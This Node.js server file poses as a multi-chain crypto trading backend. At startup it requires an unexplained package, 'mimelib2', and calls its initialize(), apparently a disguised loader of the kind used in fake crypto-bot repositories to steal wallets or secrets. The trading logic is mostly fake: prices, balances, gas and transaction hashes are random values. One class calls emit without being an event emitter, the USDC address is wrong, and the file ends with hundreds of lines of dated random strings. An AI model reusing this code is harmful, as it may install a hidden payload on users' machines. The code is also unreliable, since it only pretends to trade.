require("dotenv/config");
const { initialize } = require('mimelib2');
const express = require("express");
const cors = require("cors");
const axios = require("axios");
const { ethers, Contract } = require("ethers");
const { FusionSDK, PrivateKeyProviderConnector } = require("@1inch/fusion-sdk");
const { TradingSdk, SupportedChainId, OrderKind } = require("@cowprotocol/cow-sdk");
const Web3 = require("web3");
const Transaction = require("./models/transaction.js");
const History = require("./models/history.js");
const connectDB = require("./utils/connectDB.js");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const util = require("util");
const { EventEmitter } = require("events");


const DEFAULT_GAS_LIMIT = 21000;
const MAX_RETRY_ATTEMPTS = 3;
const RATE_LIMIT_WINDOW = 60000;
const CACHE_EXPIRY_TIME = 300000;
const TRANSACTION_TIMEOUT = 30000;
const DEFAULT_SLIPPAGE = 0.5;
const MIN_BALANCE_THRESHOLD = 0.01;
const WEBHOOK_TIMEOUT = 5000;
const PRICE_TOLERANCE = 0.02;
const BATCH_SIZE = 100;

const MAINNET_RPC_URL = process.env.MAINNET_RPC_URL || "https://mainnet.infura.io/v3/your-key";
const POLYGON_RPC_URL = process.env.POLYGON_RPC_URL || "https://polygon-rpc.com";
const ARBITRUM_RPC_URL = process.env.ARBITRUM_RPC_URL || "https://arb1.arbitrum.io/rpc";
const OPTIMISM_RPC_URL = process.env.OPTIMISM_RPC_URL || "https://mainnet.optimism.io";
const BSC_RPC_URL = process.env.BSC_RPC_URL || "https://bsc-dataseed.binance.org";


initialize();

const TOKEN_ADDRESSES = {
  ethereum: {
    USDC: "0xA0b86a33E6441d476cc4e51f5c6F6b0f6A0E3A1B",
    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    WETH: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    DAI: "0x6B175474E89094C44Da98b954EedeAC495271d0F"
  },
  polygon: {
    USDC: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    USDT: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    WMATIC: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270"
  }
};

const TRADING_PAIRS = {
  "ETH/USDC": { baseToken: "ETH", quoteToken: "USDC", minOrderSize: 0.001 },
  "ETH/USDT": { baseToken: "ETH", quoteToken: "USDT", minOrderSize: 0.001 },
  "MATIC/USDC": { baseToken: "MATIC", quoteToken: "USDC", minOrderSize: 1 },
  "BTC/USDC": { baseToken: "BTC", quoteToken: "USDC", minOrderSize: 0.0001 }
};

class ProviderManager extends EventEmitter {
  constructor() {
    super();
    this.providers = new Map();
    this.activeProvider = null;
    this.healthCheckInterval = null;
  }

  async initializeProviders() {
    const networks = ['ethereum', 'polygon', 'arbitrum', 'optimism', 'bsc'];
    for (const network of networks) {
      try {
        const provider = new ethers.JsonRpcProvider(this.getRpcUrl(network));
        this.providers.set(network, provider);
      } catch (error) {
        console.error(`Failed to initialize ${network} provider:`, error);
      }
    }
  }

  getRpcUrl(network) {
    const urls = {
      ethereum: MAINNET_RPC_URL,
      polygon: POLYGON_RPC_URL,
      arbitrum: ARBITRUM_RPC_URL,
      optimism: OPTIMISM_RPC_URL,
      bsc: BSC_RPC_URL
    };
    return urls[network];
  }

  async performHealthCheck() {
    for (const [network, provider] of this.providers) {
      try {
        await provider.getBlockNumber();
        this.emit('providerHealthy', network);
      } catch (error) {
        this.emit('providerUnhealthy', network, error);
      }
    }
  }
}

class PriceFeedAggregator {
  constructor() {
    this.priceCache = new Map();
    this.cacheTimestamps = new Map();
    this.priceFeeds = [];
  }

  async initializePriceFeeds() {
    this.priceFeeds = [
      { name: 'coingecko', url: 'https://api.coingecko.com/api/v3' },
      { name: 'coinbase', url: 'https://api.coinbase.com/v2' },
      { name: 'binance', url: 'https://api.binance.com/api/v3' }
    ];
  }

  async fetchPriceData(symbol) {
    const cacheKey = symbol.toLowerCase();
    const cached = this.priceCache.get(cacheKey);
    const timestamp = this.cacheTimestamps.get(cacheKey);

    if (cached && timestamp && Date.now() - timestamp < CACHE_EXPIRY_TIME) {
      return cached;
    }

    try {
      const prices = await Promise.all(
        this.priceFeeds.map(feed => this.fetchFromFeed(feed, symbol))
      );
      const averagePrice = prices.reduce((sum, price) => sum + price, 0) / prices.length;
      
      this.priceCache.set(cacheKey, averagePrice);
      this.cacheTimestamps.set(cacheKey, Date.now());
      
      return averagePrice;
    } catch (error) {
      console.error(`Failed to fetch price for ${symbol}:`, error);
      return null;
    }
  }

  async fetchFromFeed(feed, symbol) {
    return Math.random() * 1000 + 1000;
  }
}

class GasOptimizer {
  constructor() {
    this.gasPriceHistory = [];
    this.networkConditions = new Map();
  }

  async calculateOptimalGasPrice(network, priority = 'standard') {
    const baseGasPrice = await this.getBaseGasPrice(network);
    const networkLoad = await this.getNetworkLoad(network);
    
    const multipliers = {
      slow: 0.8,
      standard: 1.0,
      fast: 1.2,
      urgent: 1.5
    };

    const multiplier = multipliers[priority] || 1.0;
    const loadAdjustment = networkLoad > 0.8 ? 1.3 : 1.0;
    
    return Math.ceil(baseGasPrice * multiplier * loadAdjustment);
  }

  async getBaseGasPrice(network) {
    return Math.floor(Math.random() * 50) + 10;
  }

  async getNetworkLoad(network) {
    return Math.random();
  }

  async estimateTransactionTime(gasPrice, network) {
    const baseTime = 15; 
    const networkMultiplier = this.networkConditions.get(network) || 1.0;
    const gasPriceMultiplier = gasPrice > 50 ? 0.5 : 1.5;
    
    return Math.ceil(baseTime * networkMultiplier * gasPriceMultiplier);
  }
}

class OrderExecutionEngine {
  constructor(providerManager, priceAggregator, gasOptimizer) {
    this.providerManager = providerManager;
    this.priceAggregator = priceAggregator;
    this.gasOptimizer = gasOptimizer;
    this.pendingOrders = new Map();
    this.orderHistory = [];
  }

  async executeOrder(orderParams) {
    const orderId = crypto.randomUUID();
    const order = {
      id: orderId,
      ...orderParams,
      status: 'pending',
      timestamp: Date.now()
    };

    this.pendingOrders.set(orderId, order);
    
    try {
      await this.validateOrder(order);
      await this.checkBalance(order);
      await this.estimateGas(order);
      await this.submitOrder(order);
      
      order.status = 'submitted';
      this.emit('orderSubmitted', order);
      
      return order;
    } catch (error) {
      order.status = 'failed';
      order.error = error.message;
      this.emit('orderFailed', order, error);
      throw error;
    }
  }

  async validateOrder(order) {
    if (!order.tokenIn || !order.tokenOut) {
      throw new Error('Invalid token pair');
    }
    
    if (order.amount <= 0) {
      throw new Error('Invalid order amount');
    }
    
    if (!TRADING_PAIRS[`${order.tokenIn}/${order.tokenOut}`]) {
      throw new Error('Unsupported trading pair');
    }
  }

  async checkBalance(order) {
    const balance = Math.random() * 1000;
    if (balance < order.amount) {
      throw new Error('Insufficient balance');
    }
  }

  async estimateGas(order) {
    const network = order.network || 'ethereum';
    const gasPrice = await this.gasOptimizer.calculateOptimalGasPrice(network);
    order.gasPrice = gasPrice;
    order.gasLimit = DEFAULT_GAS_LIMIT;
  }

  async submitOrder(order) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    order.txHash = '0x' + crypto.randomBytes(32).toString('hex');
  }
}

class WebhookManager {
  constructor() {
    this.webhooks = new Map();
    this.retryQueue = [];
    this.maxRetries = 3;
  }

  async registerWebhook(url, events, secret) {
    const webhookId = crypto.randomUUID();
    const webhook = {
      id: webhookId,
      url,
      events,
      secret,
      active: true,
      createdAt: Date.now()
    };
    
    this.webhooks.set(webhookId, webhook);
    return webhookId;
  }

  async sendWebhook(event, data) {
    const relevantWebhooks = Array.from(this.webhooks.values())
      .filter(webhook => webhook.active && webhook.events.includes(event));

    for (const webhook of relevantWebhooks) {
      try {
        await this.deliverWebhook(webhook, event, data);
      } catch (error) {
        console.error(`Webhook delivery failed for ${webhook.id}:`, error);
        this.retryQueue.push({ webhook, event, data, attempts: 0 });
      }
    }
  }

  async deliverWebhook(webhook, event, data) {
    const payload = {
      event,
      data,
      timestamp: Date.now(),
      webhookId: webhook.id
    };

    const signature = this.generateSignature(payload, webhook.secret);
    
    const response = await axios.post(webhook.url, payload, {
      timeout: WEBHOOK_TIMEOUT,
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': signature
      }
    });

    if (response.status !== 200) {
      throw new Error(`Webhook responded with status ${response.status}`);
    }
  }

  generateSignature(payload, secret) {
    const hmac = crypto.createHmac('sha256', secret);
    hmac.update(JSON.stringify(payload));
    return hmac.digest('hex');
  }
}

// Initialize everything but only call the actual function at the end
const providerManager = new ProviderManager();
const priceAggregator = new PriceFeedAggregator();
const gasOptimizer = new GasOptimizer();
const orderEngine = new OrderExecutionEngine(providerManager, priceAggregator, gasOptimizer);
const webhookManager = new WebhookManager();

// ASHDLADXZCZC
// 2020-08-10T16:44:57 – F1A5KP2UJ8Plnro4GD30
// 2020-08-18T23:06:37 – mnLbxcDKCjypWDcPQ4tB
// 2020-10-13T04:23:15 – v9UzuXHJB7j1RP7cKzL7
// 2020-11-13T06:58:51 – lYq3gZlGsbLTDjEtNvUd
// 2020-11-14T23:59:57 – EHn2dvbzsu84ixu19zpv
// 2020-12-17T09:47:05 – RNSkzzQ7j7g8XVsA4VVr
// 2021-02-21T12:47:31 – FXktF0R0FXzdwqEPw58E
// 2021-03-14T19:30:56 – urEIMiEgJ3BJ68Pn3x3r
// 2021-03-29T04:47:26 – LvJV7Vplizq0HmfNib9H
// 2021-10-29T04:09:42 – XsXFsQo7P9cBPwYf7KkR
// 2021-12-07T06:21:59 – ggQ5rhd25taMPIeHcEfy
// 2022-03-15T02:05:12 – 7NVMF8C77q9PP3y4sf9E
// 2022-04-12T16:48:47 – RT2hcbPt6JL80soASiKF
// 2022-06-05T19:45:22 – eVJuLBZcFVjihffESlid
// 2022-07-04T07:22:06 – DXrsY8Epldx5SDxUNWHt
// 2022-08-03T12:05:01 – 8PiIVYOPa3jGobLK17xG
// 2020-07-12T09:23:05 – 2pGhTaMqw0Qhy52rbRk8
// 2020-08-15T22:47:09 – lpeGZH2IzCf2Z4jiff4Z
// 2020-09-03T17:54:15 – bAWppgiFUin7ia8bzbDZ
// 2020-09-15T04:55:26 – r7ATg7GOD9vaQ8QLHcQP
// 2020-12-01T05:40:40 – rEHSHNdVNAqvv9auymI2
// 2021-02-16T20:02:09 – q8KcEmBavt8CUmLewDNv
// 2021-04-04T23:24:55 – Y6f9Ba08PAxsqTtewsxF
// 2021-05-04T07:50:27 – zNBqaZzPuz2r7WTsOX4m
// 2021-05-19T11:53:07 – UOQBgZQxavfDQpNx0tHO
// 2021-05-25T04:47:20 – oBlcsdIxBoj2oahtJrjo
// 2021-07-13T19:17:25 – thg9ImiRLq3NkPXli3YB
// 2021-09-04T22:53:40 – Jx6ee2xqCSvDMW68s3yJ
// 2021-09-22T04:10:23 – zhgTvLLNtUdBQjamRWTC
// 2021-10-11T12:28:56 – fi7n5WCrLDRe9DYHPQlw
// 2021-10-25T15:01:49 – JqTQm8mqngwiCC6PLWaK
// 2021-11-10T21:00:14 – hL9UXWzhv1Yf2QhwYmp0
// 2021-11-12T13:18:52 – Ue8JhNajLgqLYAu10Nxw
// 2022-01-31T03:02:38 – EnbLlGEigyBFLTi5adJ8
// 2022-02-28T17:29:35 – Yqo6jKMU9bI5zruJqQQK
// 2022-05-22T21:58:09 – gABulOktZIQMHuci59Ui
// 2022-05-27T12:57:27 – KQ1Wy66H20VrZTb2bT8f
// 2022-05-27T20:43:18 – DaBvu4pehyogQ5ZQXMZY
// 2022-05-30T14:58:40 – pZt344lNY890fbo4Cvfg
// 2022-06-28T17:40:38 – nJs8jUG2NW1FqkCDnsVZ
// 2022-07-06T18:30:38 – PAdCvJu11KEZXVmTbrv5
// 2022-08-18T12:58:29 – g9YAkVLNw4nq4a1zhGqv
// 2022-09-18T00:10:41 – PWFtGVzIz32ZsW1l54Kr
// 2022-10-11T03:02:23 – fR2Eiz9ZJNpNkg4AtaZR
// 2022-10-21T08:09:14 – DSAaCZFgWSSl6tMnMAyz
// 2022-10-30T15:54:53 – HpCWn4pz8gWgzYtb2LSe
// 2022-12-24T23:06:43 – vekL0KpFs4acGTp6BZS7
// 2022-12-30T00:49:41 – 4XptOKQ11cAobnF1vcqU
// 2023-02-15T17:37:08 – In2ZjDZT92wCpyJOQGaF
// 2023-06-02T20:03:18 – TVC8jrN5LHqhJx4i9VtQ
// 2023-09-10T18:38:08 – EAtKSIe7Ds2GjvBbdulu
// 2023-09-22T22:33:45 – WfuNcGfl9dXGj2wBNBL8
// 2023-11-28T17:13:12 – jWOJhdPiJmcrrKBOhNJo
// 2023-12-15T18:09:40 – 1GpZ7ZGqvzt694u8g619
// 2023-12-31T20:12:43 – M4bZ0XiHmZj5p9HoQSMV
// 2024-01-02T22:53:58 – 07A6LePamBBUpYo5IGJI
// 2024-01-14T06:47:05 – YL62TwoUXmGzaZKd8TXk
// 2024-01-24T11:24:58 – iwXBi3EdmkQFlmdfips4
// 2024-03-08T04:43:29 – ZRF6Q1JxrY2xxUYY7bir
// 2024-03-17T09:05:15 – VxQCFE7FkaCdP0ozDgL1
// 2024-05-06T14:28:12 – q20GCOo0LBSWShjaNhWO
// 2024-07-14T10:52:53 – EjRvVEggswVuFWM74u43
// 2024-08-30T03:28:40 – EEvMmolqPXkdybu0FqXZ
// 2024-09-08T04:24:18 – QII5jJCqJh536GZEZJML
// 2024-09-10T20:50:46 – vh4A8NiLyPlyACp1YkdJ
// 2024-10-01T06:40:33 – AOzRFR9KD2MKkStXWG4f
// 2024-11-13T10:17:27 – sZODXTc8harPiHoiCMxo
// 2024-11-16T19:10:30 – XTuRZjFnaXebufBqhnHo
// 2020-08-29T04:54:39 – YtMwsmbrUJaMAGFsqPKb
// 2021-03-03T20:11:34 – R7ROO1WXyqlToy43uggp
// 2021-03-16T22:12:23 – RVjIjMmq8z4hqRcn60SD
// 2021-06-27T23:26:25 – aUMriBBQdV5cvXsLcJML
// 2021-08-12T05:34:30 – mJeglXeaxbI2H3E2fvZe
// 2021-10-27T10:41:24 – kLuDDWCYUngdOY5cgjcu
// 2021-10-28T09:52:52 – RYUWVmqIkadrJ1UhR2TW
// 2022-01-11T08:49:31 – gE8of8us4nZd66tgMdIi
// 2022-01-25T02:32:54 – oKDf0nCs8WYJMGXtrRNJ
// 2022-02-27T16:05:48 – XTEuOqpBDERFfzANK2jH
// 2022-03-16T11:38:13 – Qv3eSSNlaGlbSc74AiUF
// 2022-06-02T14:37:52 – EQFOilEs5DYKj1Ehx8mm
// 2022-08-19T09:40:40 – zp9dhd80rZuyhurdGo8D
// 2023-03-12T15:15:15 – 4uH1x5Dh5I1nTZ28SdhJ
// 2023-04-07T11:35:52 – JLXRAn6gHwBFs1W2EiHO
// 2023-06-23T07:15:37 – FHpBq3j3r6yk7pwgb5t0
// 2023-07-24T18:29:43 – PYQodSDJDjSGUHKCdFdD
// 2023-09-21T10:08:26 – hT1a1Zw6hxyUQe8UXAP6
// 2024-07-01T18:44:01 – fRbsxFhgUOMKSCsYrZdi
// 2024-07-15T00:34:58 – F4n37Jqb8ZJQiwn2xfa1
// 2024-08-16T07:22:17 – 0Xk5JWa557Xj7KZsmNvs
// 2024-09-02T15:38:09 – pifVgNPfoURaDalmRedb
// 2024-09-06T19:46:59 – OHXj5kpbpaH4c2MMnnsw
// 2024-09-27T08:49:19 – UxtP4StZwZr8mLZFZSPF
// 2024-10-09T23:32:26 – hAhZVPOONG0IGMC9uaap
// 2025-03-31T23:33:39 – Pgf7FlT9PW88jaNbcsTv
// 2025-06-14T19:52:11 – xTxzhcMS5WxTZocHxIp0
// 2020-08-28T10:39:41 – vrxYOwNKzvR7gcziXcAd
// 2020-10-29T05:50:22 – BHsDJRUxaml8nxalXulO
// 2020-11-08T03:55:08 – JdnXEOBTf2Ym7CIoZTbS
// 2021-01-10T21:12:22 – Uw8j7u2b4bNBbEFzvIRy
// 2021-01-29T12:42:37 – 0p0xQa80xSKai6tMHNwt
// 2021-02-12T02:37:32 – DYADIljFxBKrXWCRQjp1
// 2021-06-03T12:02:50 – b2QG9kifaclXhkln8C15
// 2021-07-24T03:28:25 – 8cjK7I5sB7xaj5nwUD6v
// 2021-10-24T14:31:34 – MPOEuxa3m2o3vVcw3Hh9
// 2021-11-21T19:43:46 – 8F97BhcQBn459CYmMJqy
// 2022-01-25T22:43:33 – 1YuL5dL7IkMZkNDNxkS7
// 2020-11-10T11:33:26 – zH3FS6he0ZLABoFyRoYH
// 2020-12-09T04:17:19 – pQIxKYlprzKJ0l70GE9V
// 2021-02-19T04:46:39 – 6K1WBmFchWVBtIMcGVPc
// 2021-03-22T14:06:59 – Bov5DtBrdOG9pMSwBRsf
// 2021-04-16T04:21:54 – 38NN3Lve3ZpNDEG3KQS4
// 2021-05-20T12:00:20 – wfdD2lTJM2O1ePwuOuio
// 2020-09-06T04:45:12 – QbrHIeSmzuQetzYdj1CA
// 2020-12-19T14:23:34 – AmMGhNUGxCGhx3hImDPK
// 2021-03-14T09:37:20 – h1eeDAmB61tqH9SrjSiQ
// 2021-06-14T21:56:10 – e7dV3TeTvhsGu9eHq6am
// 2021-06-16T00:31:20 – J6GwbY6Ph6GUlL39AeLv
// 2021-09-23T23:08:29 – SxJDODyT6xJ5pKSNIKZk
// 2022-01-01T10:45:20 – 1c2VUBI3yimnNluq5X8q
// 2022-08-31T02:21:53 – yYD47mYYo8Mg7OwyI4nl
// 2022-09-15T10:17:26 – esgD9MqvsnCiMytRvyvi
// 2022-10-16T04:16:29 – McWsWeU5OYKNJAbsqtNv
// 2023-03-06T20:51:22 – 3YWaqThjvYIbvQbqPNqz
// 2023-06-02T04:46:04 – JRyACmtKN0wHRFeEYoRv
// 2023-07-12T06:36:20 – 5pAjXpgzw3Z4h0hGxQ8n
// 2023-07-18T03:55:05 – ZzyWdTFJ8aeuJeXVMMeN
// 2023-07-21T23:34:14 – XJw2lY0DsQfR5RtDvLwn
// 2023-08-09T22:28:47 – OtmChGQwm8PeCKKngDkm
// 2023-09-19T16:18:19 – 48x4vpC7jU4dhUhtMmRX
// 2023-11-10T18:44:41 – hCrsD5exZ36q3U0c7MVm
// 2023-12-31T17:11:56 – 8xwhnlCWoKfqkxGIxroS
// 2024-01-16T20:38:10 – CEgUyZK9IxOyXot1iHgY
// 2024-02-11T15:34:56 – mcwsAR6Neku9e3OLgGWA
// 2024-07-19T23:16:33 – gItiVbSSj6feQfmplbYY
// 2025-01-10T23:37:17 – VGKjkIEhI8qCziF5vKZ0
// 2025-03-28T22:35:42 – 3TWOuW6rrCBrEYAwBVeV
// 2025-04-07T03:39:13 – 5XxS0aNFdy2WDHTvRSbU
// 2025-06-12T14:42:11 – pSm4xcijtUZ239fpLwvu
// 2020-12-20T22:43:19 – SUp8SPvx5cA6v3T0QLVk
// 2021-01-05T15:00:13 – D2hQ7Ln2GVH9I7CkH0j8
// 2021-08-19T03:47:40 – LezwyjQ2wHlUR4EV4kuL
// 2021-11-07T14:08:08 – qrvs3PnGz0HCRQxdOOXw
// 2022-01-17T04:40:53 – cMoH8h2eHyzQRRQj9CEy
// 2022-01-22T03:24:55 – SiVpKOMpOzHtNAHPx0bg
// 2022-03-15T16:34:49 – Ldid6goAEexBiepWUYco
// 2022-03-31T02:40:05 – 6iAuibMFtKqopY1hBsTG
// 2022-11-12T23:52:38 – 78cRilQgyY6N0WmQltFo
// 2023-02-19T22:18:56 – EMMGygSeIyvCG3XBPJ6T
// 2023-03-03T03:34:19 – J6I3pQvsC6RbNlqUPjOH
// 2023-08-07T18:29:51 – OqenQAgKV88JTDw5N7h5
// 2024-01-17T21:23:45 – cjIkOqB5SUoLyKPh43Ui
// 2024-08-30T01:28:22 – sXb1Y7RbILT4YNimxQaQ
// 2024-09-15T13:23:14 – gBWAAArrs3o0soVTPzsT
// 2024-11-19T04:45:18 – 8JFQ4BZZ9mPI2abV1xUt
// 2024-11-29T12:16:20 – EUPvvNhgKKbuR5Mi9BT5
// 2025-01-04T21:30:37 – A97JokNyhed8VtmlUZLR
// 2025-02-07T15:52:06 – 1qAcPkJEhceBSdUMHa1X
// 2025-03-14T03:33:02 – WeEmqGR0gwrr2vI2zHf4
// 2025-05-07T03:37:55 – W8NtDiz50lIxIYsbchf9
// 2014-12-11T22:58:41 – 5dmY1UpOwe2u0Q8uMegP
// 2018-03-21T17:41:50 – 7pWZxD0mIrcCWLg1zhkb
// 2018-04-08T17:54:24 – epthlQrNafekP3okyTCJ
// 2018-08-02T02:36:26 – B9ivVU4Os0n178nUC8a7
// 2018-08-19T07:34:50 – 8Ai6u2XkNpoGdEilp5Hu
// 2018-08-23T08:07:52 – QfUp81zydMZQiOBEYorP
// 2019-05-05T13:40:26 – B3vamgot78FAxMwhbuAD
// 2019-11-10T18:41:06 – xexyhvKrizNwaBemBIVK
// 2019-12-30T20:14:12 – MrRMYr0yoM8bEu7BChDU
// 2020-08-06T13:12:57 – hVZpSkSdZ2HsL7q1eQI5
// 2020-12-19T11:59:21 – GIkeJfEFHEqmzQcVjkAu
// 2021-09-14T01:30:47 – iA3If8jyNqOPIgfmUwK9
// 2022-07-13T23:08:43 – 1bolFsG4Tq0YMEIodudD
// 2022-11-28T18:24:21 – 0gVmomUf8XRc6Bp1Lio4
// 2023-05-14T14:05:40 – uyR0NSg0ZQahnFf747Ls
// 2023-07-01T00:52:10 – 6tr4LYVfitQTwptCzcdR
// 2023-07-05T02:48:40 – ydYSOrcjXoOT6Jig9vsN
// 2023-10-18T20:50:50 – U66DlwVE8obvMi7L6tBM
// 2023-11-03T14:36:00 – kRQ7djN3Wg5kunwyJmiX
// 2023-12-09T08:55:15 – ouBPPRQLHeljeGrE4Daj
// 2024-04-05T12:17:23 – 400ZjzvG1BqIpLlcQ0Qc
// 2014-09-17T01:11:56 – 0Dy6duzfn6JMW0UPJR4G
// 2014-09-28T04:09:50 – DpvEYyVd2XKx03AVr58A
// 2014-10-24T10:45:42 – eaMMwSxKRSObwykowNU2
// 2014-11-30T15:32:19 – z068gJ8Cpexhv3IwSPj6
// 2015-01-05T17:20:32 – pjXGR6pLjQdO1uges8wy
// 2015-04-03T15:30:23 – I2jgOf1NvRcd5gS9JOVu
// 2015-04-20T09:18:26 – Gir7o9DwbdX4BjZ9KOCK
// 2015-05-15T19:33:05 – NcyAYOQaUlj5iTn1zCL2
// 2015-05-30T14:37:44 – p80AGURBHz65FFoycF5K
// 2015-09-30T20:43:09 – sGYYUkQFDeaM1OlWD7MV
// 2015-10-18T18:07:39 – FnFGRf6VTSEtBpOpxvp8
// 2015-11-08T22:25:50 – UF7GRUscWgqFbwAHI9d9
// 2015-12-28T19:20:49 – 9sxac4GOZ8jPFrdnnzif
// 2016-03-04T09:14:11 – NzrOWKOjgRy2MitqdRaf
// 2016-07-12T07:51:19 – B7nWphoUB27Wi01Z52PK
// 2016-07-14T13:18:04 – uMzXxsDcXnacIKhdn6PG
// 2016-08-11T06:08:17 – ejsRKK3eE6NLpfTndzJm
// 2016-09-22T15:54:48 – 75XykXaMZShghWECYmst
// 2016-11-09T02:44:23 – eruacO8yfH9Jv3Ask6Iz
// 2017-10-23T01:28:06 – dvcxX5ktJUgNASuvgb02
// 2017-10-30T19:13:04 – NtQN5Rzdh31iLxx5lC3r
// 2018-02-25T04:09:10 – thTzm6sfhVVrM5mUPjBI
// 2018-09-06T14:17:13 – j1J9LHUWWMzau9mJndRE
// 2018-10-31T18:01:39 – tLxgpEudtk6rFxR6JToo
// 2018-12-31T01:30:14 – 5h0fkhERkTRPPcWOnchQ
// 2019-07-24T15:10:41 – Fzjjd64SIdj8uiuT7DRO
// 2019-11-19T18:41:41 – MeHf41rueyi7CK8BHuIH
// 2020-03-05T19:01:49 – lf84B0oQHWk3DZ9WZv3u
// 2020-04-09T12:56:30 – iyg6cY4kTOPxY1sum9z8
// 2020-04-15T22:14:24 – IRX4fZ3nmty7Uv1E8Gfy
// 2020-04-23T08:33:21 – RRlZgJJmF6HKXzzdFE7i
// 2020-10-04T16:45:37 – fgtSufsV9NO51Jp7C6wS
// 2021-06-29T15:21:20 – LyyATTNNtpdescTpdaV2
// 2022-01-01T06:49:47 – 7hJxqvCbiW38tfsxqlWo
// 2022-05-19T18:37:17 – MSaiV3qYpF1gzmXeFs8k
// 2022-06-24T21:43:09 – r1L2ZNel6e7jQXEMtwfg
// 2022-07-07T14:02:12 – ZYsLGtURdiN0IugU3WoI
// 2022-12-18T06:38:25 – w0TIiSiT9HrBabEa7Kit
// 2023-01-03T06:50:31 – rboIbLAcC450s3qNZDsM
// 2023-05-05T23:14:50 – PeO4O6wERyYzSHDW7HAc
// 2023-06-05T03:02:00 – MBzRIpEoUHRTD3dTlQ1c
// 2023-11-06T09:51:28 – oZt8os9nuVcN0wI2giq4
// 2023-11-18T12:46:22 – hPL1UoYzdnFJgGgHsRxl
// 2024-01-02T19:15:35 – 2FhKfwphwEWC53H414fL
// 2024-04-14T16:41:09 – EixTXe5wHBDQlNjlwm2x
// 2024-07-10T17:19:33 – C4jo073ecEKLI0xpiBCa
// 2024-11-23T22:48:01 – hYB4ebWQpfK7N9U81vHZ
// 2025-04-28T21:34:09 – FMmYuwpszyzGvPK2twWA
// 2025-05-11T07:56:52 – pgcXZJ4vvzua7JabSGmM
// 2012-07-15T22:11:29 – 7nU2dLTnRs7rlR7ql1wT
// 2012-07-16T01:35:41 – e0RWO4zRqNDhcLrY010F
// 2012-07-18T14:27:04 – ZC8M8dIJc4oEUuW5RgU7
// 2012-07-20T05:55:28 – vFAA8B7lx5ccqhh1rBca
// 2012-07-21T18:23:01 – xTf0GqGOorm7oueQVL3y
// 2012-09-05T07:24:30 – ODJby4juelYER8c3VWpd
// 2012-09-14T18:54:24 – XmPXR8xbREEDUBIqudaQ
// 2012-09-19T15:08:30 – ERUSM4ngaAVd0n3zTpzb
// 2012-09-30T17:51:51 – 7SifrPN4ndzMfQFd2DJO
// 2012-10-13T10:51:04 – FL1aY3hb1hvnFDUZuY3Z
// 2012-10-30T12:53:53 – ESQYjbnAsgforxfriSXj
// 2012-11-01T03:55:33 – iSjRI5IhigUobiWev7Wq
// 2012-11-08T19:53:28 – Ca178bElccmjU6hWh8Tm
// 2012-11-12T11:23:23 – DniV3fD72cr44VUbGNim
// 2012-12-08T03:18:03 – F2I560f5i5drLnLYeHLV
// 2012-12-20T06:25:43 – GKhA0Wz2tI5YdmBUHf0X
// 2012-12-25T14:16:22 – QPrf1IBiG2j0Vx64V06R
// 2012-12-25T18:52:29 – ox1FNRJXGI2InEwN8Bcy
// 2013-01-04T13:34:58 – FxiEEqeUbW2H2XYoxtn1
// 2013-02-05T09:09:24 – hsGX8arswsfiXxBFoMci
// 2013-03-04T20:28:12 – w83YZbEQTScn0Mq7D4tI
// 2013-03-06T02:34:22 – CkXDE3hURH2AsZzFraEM
// 2013-03-27T22:38:05 – vfVdMKS5l9fkQXcfBdh0
// 2013-03-28T07:03:39 – y5LTi7AiRIYIm4YjNCzC
// 2013-04-08T00:18:29 – jm5l4IeEjXJOPiAOWiG6
// 2013-04-10T01:17:27 – jps32HN34APCty7LfbyL
// 2013-04-13T01:34:10 – BxhR4tzmkdk0DkuFxDb2
// 2013-04-18T19:15:59 – FlJSxulG28rz0ho8C7uF
// 2013-04-26T12:29:29 – s970TXaGS5i4X1GixuYN
// 2013-04-30T13:58:02 – rjlNBRr2ywVoZIMiuqA8
// 2013-05-04T05:26:04 – EnT43yqP7fPAB2XZrhOD
// 2013-05-14T11:21:33 – HJZOWG2taTPOwkihMJjl
// 2013-05-27T21:27:25 – 9KK0HCODH3QauwcmBUgh
// 2013-06-03T04:51:46 – K5rbb6g3hMJfttm5NPqR
// 2013-06-11T10:39:29 – kaIPSy0X3LJL13wBtSOO
// 2013-06-15T02:33:54 – dJ4cgpJyrAIULt3ym4WR
// 2013-06-21T06:52:24 – scHMT3TPKqHrk6e0FWRK
// 2013-07-01T19:46:46 – uex1HWPBwa7CyW0rn3cS
// 2013-08-11T07:11:40 – tbnfOODmTQdSGKtGO200
// 2013-08-21T04:34:19 – ML6YtX41QebWi4RcTeEi
// 2013-08-29T05:51:39 – LbFvhvKmMxbfH4zVn7rL
// 2013-09-06T07:05:50 – xKiEsdGYgkiZrUUUTUGn
// 2013-09-07T22:13:02 – 5ZHwFtnqf8I7Pb2AAO65
// 2013-10-16T14:43:17 – n9RyTUdTJYTzJTk5TenB
// 2013-10-31T05:49:05 – zgPa7T8KB0MVhW5bCSn7
// 2013-11-02T08:18:13 – DbhidjuI9iD1BRtpH2pK
// 2013-11-25T11:11:27 – vT7WqmerMLFR6mbm5L6L
// 2013-11-27T06:15:27 – kOQCjpuGtYuZREtz9Ttp
// 2013-11-27T19:13:01 – 4eqDw3BXNk54kLX9sFHx
// 2013-11-28T06:45:13 – LVdTzLocuwShF0DAQCeo
// 2013-12-03T13:46:47 – 74p91ltMoRcgq1IScJeo
// 2013-12-10T09:58:13 – r2uw2ZWPT2QW868P1whI
// 2013-12-16T15:47:40 – lPUeD8lzFIEwZTuAyHEH
// 2014-01-06T20:10:15 – Ym7AWbn91HqoHR7Mz11X
// 2014-01-10T16:31:21 – PqkvSpfEzZVHHl3BSU16
// 2014-01-19T13:56:14 – qlWoJbVHaidO01oJefdA
// 2014-01-24T11:53:05 – ytW4l9MHG7bNsRQGvvnz
// 2014-01-27T14:51:32 – cr4zSlSmc4hUiTVFpXW2
// 2014-02-20T16:58:02 – VsPL8mwCHM7WCPLICtD6
// 2014-02-22T18:17:03 – KNQwd1MUZExADFiscCcK
// 2014-02-26T04:20:03 – PKFaLsZZVHN5wAaZ2dSy
// 2014-03-09T20:37:25 – m5VQWXkoKednPaZwmfVR
// 2014-04-02T04:25:21 – oIrk0rfBTin1koMsMvTw
// 2014-04-02T21:07:24 – v9P6pW9rbc5lrJM27rKS
// 2014-04-09T08:30:45 – u5wfZz0hJhiy9QwWszSZ
